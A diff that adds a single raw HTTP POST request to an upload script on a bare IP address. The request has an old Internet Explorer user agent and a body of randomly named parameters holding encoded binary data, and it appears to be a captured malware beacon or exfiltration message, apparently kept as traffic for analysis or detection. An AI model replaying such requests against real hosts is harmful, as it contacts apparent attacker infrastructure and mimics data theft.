@@ -1,0 +1,15 @@
+POST /upload/_dispatch.php HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Referer: http://93.170.123.219/upload/
+x-requested-with: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
+Host: 93.170.123.219
+Content-Length: 596
+Connection: Keep-Alive
+
+
+wJitUPq=C%B8W%BCx%D4%26%3C%1A%94Ja%29%CF%CF0%3D%3Cr%18%97%CAJ%FAU&hjGqVvx=E%B2%E9%D1%8E%1A%FE%BE%99%95%B1+%D8%DD%7FU%A3%11%A9X%872-%14d%A0%9E%C7%F0D%C1&XpNcfXMP=%9E%8F%CF%06%16m%CC%D8%1Dx%887%93%D6%08%82%96v%86%D9%1C%DAw%7B%989d%C6%F2%B4%E4%5C%D9Qt&oRw=x%2BS66%C3%81%BC%B5%9EG%94_%5C4s%0C+%C1L%95%1Ejy%8B%D6%40%04o%B9%0E7%E6%9FR%96e%5E%09%019%7F&OdH=d%F7y%21mOA%AAY%BFCg%A2%CB%99%97%F8E%A2%22%12%DEe%DBg%01L72%23%00%7B%18%96%D5%F6C%FC%96%7F%99U%3C&VNQrCHL=%C7%EE%5B%8C%94V%40g%CF%0F%B44%9B%A8%A3%E2%EBfj%DE%14%2C%E9%2C%E9%DD%AD%F36%E2%BD%1D%E8y&GGBKCW=%F2%5Bj%C1%7C%D2%E3%95z%98%0C%9D%A7%E6%7C%28
